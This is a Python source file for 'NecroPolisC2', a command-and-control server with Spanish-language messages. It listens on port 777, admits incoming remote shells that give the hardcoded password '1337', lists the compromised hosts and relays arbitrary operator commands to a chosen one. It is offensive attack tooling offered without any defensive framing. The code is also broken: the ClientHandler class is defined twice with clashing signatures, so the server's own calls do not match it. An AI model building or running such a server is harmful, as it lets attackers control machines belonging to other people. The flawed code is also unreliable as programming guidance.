import socket
import threading
import time
import sys
import select
import signal

class ClientHandler(threading.Thread):
    def __init__(self, conn, addr, client_id, server):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.client_id = client_id
        self.server = server
        self.alive = True
        self.lock = threading.Lock()
        self.buffer = b""

    def run(self):
        try:
            while self.alive:
                ready = select.select([self.conn], [], [], 0.5)
                if ready[0]:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    with self.lock:
                        self.buffer += data
                    self.print_output()
                else:
                    time.sleep(0.1)
        except Exception:
            pass
        finally:
            self.close()

    def print_output(self):
        try:
            text = self.buffer.decode(errors='ignore')
            print(f"\n[Cliente {self.client_id}]:\n{text}", end="")
            self.buffer = b""
            if self.server.selected_client == self:
                print("necropolisc2> ", end="", flush=True)
        except Exception:
            self.buffer = b""

    def send(self, message):
        try:
            with self.lock:
                self.conn.sendall(message.encode('utf-8'))
        except Exception:
            self.close()

    def close(self):
        if self.alive:
            self.alive = False
            try:
                self.conn.shutdown(socket.SHUT_RDWR)
                self.conn.close()
            except Exception:
                pass
            with self.server.lock:
                if self.client_id in self.server.clients:
                    del self.server.clients[self.client_id]
                    print(f"[!] Cliente {self.client_id} removido.")
            if self.server.selected_client == self:
                self.server.selected_client = None
            print(f"[-] Conexión con cliente {self.client_id} cerrada.")

    def __str__(self):
        return f"{self.addr[0]}:{self.addr[1]}"

class NecroPolisC2:
    def __init__(self, host='0.0.0.0', port=777, password='1337'):
        self.host = host
        self.port = port
        self.password = password
        self.server_socket = None
        self.clients = {}
        self.client_counter = 0
        self.selected_client = None
        self.lock = threading.Lock()
        self.running = False
        self.prompt = "necropolisc2> "

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        self.running = True
        print(f"[+] NecroPolisC2 iniciado en {self.host}:{self.port} con contraseña '{self.password}'")
        threading.Thread(target=self.accept_clients, daemon=True).start()
        self.cmd_loop()

    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                threading.Thread(target=self.handle_client_auth, args=(conn, addr), daemon=True).start()
            except Exception as e:
                print(f"[!] Error aceptando conexión: {e}")

    def handle_client_auth(self, conn, addr):
        try:
            conn.settimeout(10)
            conn.send(b"Password: ")
            received_pass = conn.recv(1024).decode(errors='ignore').strip()
            if received_pass != self.password:
                conn.send("[-] Acceso denegado. Contraseña incorrecta.\n".encode('utf-8'))
                conn.close()
                print(f"[-] Acceso denegado a {addr} - contraseña incorrecta.")
                return
            conn.send(b"[+] Acceso concedido. Shell lista.\n")
            conn.settimeout(None)

            with self.lock:
                self.client_counter += 1
                client_id = self.client_counter
                client_handler = ClientHandler(conn, addr, client_id, self)
                self.clients[client_id] = client_handler
                client_handler.start()

            print(f"[+] Nueva conexión: {client_handler}")
        except Exception as e:
            print(f"[!] Error manejando autenticación de {addr}: {e}")
            try:
                conn.close()
            except:
                pass

    def cmd_loop(self):
        try:
            while self.running:
                cmd = input(self.prompt).strip()
                if not cmd:
                    continue
                parts = cmd.split()
                base_cmd = parts[0].lower()

                if base_cmd == "help":
                    self.print_help()
                elif base_cmd == "list":
                    self.list_clients()
                elif base_cmd == "select":
                    if len(parts) < 2 or not parts[1].isdigit():
                        print("[-] Uso: select <id>")
                        continue
                    self.select_client(int(parts[1]))
                elif base_cmd == "disconnect":
                    if len(parts) < 2 or not parts[1].isdigit():
                        print("[-] Uso: disconnect <id>")
                        continue
                    self.disconnect_client(int(parts[1]))
                elif base_cmd == "exit":
                    print("[*] Saliendo...")
                    self.running = False
                    break
                else:
                    # Enviar comando al cliente seleccionado
                    self.send_command(cmd)
        except KeyboardInterrupt:
            print("\n[*] Saliendo por Ctrl+C...")
            self.running = False
        finally:
            self.shutdown()

    def print_help(self):
        print("""
Comandos disponibles:
  help                  - Mostrar esta ayuda
  list                  - Listar clientes conectados
  select <id>           - Seleccionar cliente para enviar comandos
  disconnect <id>       - Desconectar cliente especificado
  exit                  - Salir del servidor
  cualquier otro texto  - Enviar comando al cliente seleccionado
""")

    def list_clients(self):
        with self.lock:
            if not self.clients:
                print("[-] No hay clientes conectados.")
                return
            for cid, client in self.clients.items():
                status = "Alive" if client.alive else "Dead"
                selected = "<-- seleccionado" if cid == self.selected_client else ""
                print(f"{cid}. {client} [{status}] {selected}")

    def select_client(self, client_id):
        with self.lock:
            if client_id not in self.clients:
                print(f"[-] Cliente '{client_id}' no encontrado.")
                return False
            client = self.clients[client_id]
            if not client.alive:
                print(f"[-] Cliente '{client_id}' está desconectado.")
                return False
            self.selected_client = client_id
            print(f"[+] Cliente '{client_id}' seleccionado: {client}")
            return True

    def disconnect_client(self, client_id):
        with self.lock:
            client = self.clients.get(client_id)
            if client:
                client.close()
                del self.clients[client_id]
                print(f"[+] Cliente '{client_id}' desconectado.")
                if self.selected_client == client_id:
                    self.selected_client = None
            else:
                print(f"[-] Cliente '{client_id}' no encontrado.")

    def send_command(self, command):
        if self.selected_client is None:
            print("[-] No hay cliente seleccionado. Usa 'select <id>'.")
            return
        with self.lock:
            client = self.clients.get(self.selected_client)
        if client is None or not client.alive:
            print(f"[-] Cliente '{self.selected_client}' no disponible.")
            self.selected_client = None
            return

        try:
            client.send(command + "\n")
            # Esperar respuesta breve
            time.sleep(0.3)
            output = client.receive(timeout=1.5)
            if output.strip() == "":
                print("[!] Sin respuesta del cliente.")
            else:
                print(output.strip())
        except Exception as e:
            print(f"[!] Error enviando comando: {e}")

    def shutdown(self):
        print("[*] Cerrando conexiones...")
        with self.lock:
            for client in list(self.clients.values()):
                client.close()
            self.clients.clear()
        try:
            if self.server_socket:
                self.server_socket.close()
        except:
            pass
        print("[*] Servidor detenido.")

class ClientHandler(threading.Thread):
    def __init__(self, client_socket, addr, client_id):
        super().__init__(daemon=True)
        self.client_socket = client_socket
        self.addr = addr
        self.client_id = client_id
        self.alive = True
        self.lock = threading.Lock()
        self.buffer = b""

    def __str__(self):
        return f"{self.addr[0]}:{self.addr[1]}"

    def run(self):
        try:
            while self.alive:
                try:
                    data = self.client_socket.recv(4096)
                    if not data:
                        print(f"[-] Cliente {self.client_id} desconectado.")
                        self.alive = False
                        break
                    with self.lock:
                        self.buffer += data
                    self.print_output()
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Error con cliente {self.client_id}: {e}")
                    self.alive = False
                    break
        finally:
            self.close()

    def print_output(self):
        try:
            with self.lock:
                text = self.buffer.decode(errors='ignore')
                self.buffer = b""
            if text.strip():
                print(f"\n[Cliente {self.client_id}]:\n{text}")
                # Reprint prompt only if this client is selected
                # (Assuming access to server.selected_client would be handled externally)
                print("necropolisc2> ", end="", flush=True)
        except Exception:
            with self.lock:
                self.buffer = b""

    def send(self, message):
        try:
            with self.lock:
                self.client_socket.sendall(message.encode())
        except Exception as e:
            print(f"[-] Error enviando datos al cliente {self.client_id}: {e}")
            self.alive = False
            self.close()

    def receive(self, timeout=1.5):
        self.client_socket.settimeout(timeout)
        total_data = b""
        try:
            while True:
                data = self.client_socket.recv(4096)
                if not data:
                    self.alive = False
                    break
                total_data += data
                if len(data) < 4096:
                    break
        except socket.timeout:
            pass
        except Exception as e:
            print(f"[-] Error recibiendo datos de cliente {self.client_id}: {e}")
            self.alive = False
        try:
            return total_data.decode(errors='ignore')
        except Exception:
            return ""

    def close(self):
        if self.alive:
            self.alive = False
            try:
                self.client_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.client_socket.close()
            except:
                pass
            print(f"[-] Conexión con cliente {self.client_id} cerrada.")

if __name__ == "__main__":
    import signal
    import sys

    c2_server = NecroPolisC2(host='0.0.0.0', port=777, password="1337")

    def signal_handler(sig, frame):
        print("\n[!] Señal de interrupción recibida, cerrando servidor...")
        c2_server.shutdown()
        print("[*] Servidor cerrado correctamente. Adiós.")
        sys.exit(0)

    # Captura señales para cerrar con Ctrl+C o kill
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("[*] Iniciando NecroPolisC2 en 0.0.0.0:777...")
    try:
        c2_server.start()
    except Exception as e:
        print(f"[!] Error crítico en el servidor: {e}")
        c2_server.shutdown()
        sys.exit(1)

